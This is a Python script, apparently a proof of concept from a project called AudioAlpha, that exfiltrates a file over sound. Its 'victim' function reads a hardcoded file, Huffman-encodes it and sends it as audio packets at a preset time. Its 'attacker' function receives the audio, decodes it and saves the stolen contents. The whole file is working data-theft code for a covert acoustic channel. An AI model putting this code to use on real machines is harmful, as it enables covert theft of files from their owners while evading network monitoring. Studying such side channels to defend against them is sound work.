import huffman.huffman as huffman
import huffman.freq as freq
from sound.sound_decoder import *
import textwrap
import datetime

FILE_TO_STEAL = '/home/yaniv/PycharmProjects/AudioAlpha/data/my_codes.txt'
STOLEN_FILE = '/home/yaniv/PycharmProjects/AudioAlpha/data/his_codes.txt'
LEAK_TIME_STR = '11:40'
LEAK_TIME_HOUR = int(LEAK_TIME_STR[:2])
LEAK_TIME_MIN = int(LEAK_TIME_STR[3:5])

def victim(sound_send,sound_recv):
    with open(FILE_TO_STEAL) as f:
        data = f.read()
    huffman_data = huffman.huffman_decimal_encode(data)
    sendAudioPacket(huffman_data, sound_send,sound_recv)

def attacker(sound_send,sound_recv):
    huffman_data = recvAudioPacket(sound_send,sound_recv)
    if (huffman_data != ''):
        data = huffman.huffman_decimal_decode(huffman_data)
        print(data)
        fd = open(STOLEN_FILE, 'w')
        fd.write(data)
        fd.close()
    else:
        print('attacker() got huffman_data null')

def main():
    leak_time = datetime.time(LEAK_TIME_HOUR, LEAK_TIME_MIN, 00)
    while (datetime.datetime.now().time() < leak_time):
        pass
    sound_send = Encoder()
    sound_recv = Decoder()

    victim(sound_send,sound_recv)
    #attacker(sound_send,sound_recv)

if __name__ == "__main__":
   main()